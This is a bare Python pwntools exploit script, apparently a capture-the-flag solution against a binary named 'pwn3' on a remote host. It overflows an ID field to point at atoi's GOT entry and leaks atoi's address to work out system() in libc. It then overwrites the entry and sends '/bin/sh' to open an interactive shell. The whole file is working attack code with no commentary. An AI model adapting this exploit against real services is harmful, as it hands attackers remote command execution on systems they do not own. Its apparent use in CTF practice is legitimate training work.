from pwn import *

#context.log_level= 'debug'
libc = ELF('./libc') 
#libc = ELF('/lib32/libc.so.6')

io= remote('106.75.18.19', 32156)
#io = process('./pwn3')
e = ELF('./pwn3')

io.recvuntil('id')
io.sendline('A'*7)

io.recvuntil('=>')
io.sendline('5')

io.recvuntil('=>')
io.sendline('1')
io.recvuntil('ID')
io.sendline('A'*12 + p32(e.got['atoi']) + p32(0x20))


io.recvuntil('=>')
io.sendline('4')
io.recvuntil('name:\t')
buf = io.recv(3) + '\x00'
atoi_addr = u32(buf)
log.success('atoi:'+ hex(atoi_addr) )

system_addr = atoi_addr - libc.symbols['atoi'] + libc.symbols['system']
log.success('system:'+ hex(system_addr) )

io.recvuntil('=>')
io.sendline('2')
io.recvuntil('members')
io.sendline('16')

io.recvuntil('=>')
io.sendline('3')
io.sendline(p32(system_addr))

io.recvuntil('=>')
io.sendline('/bin/sh')

io.interactive()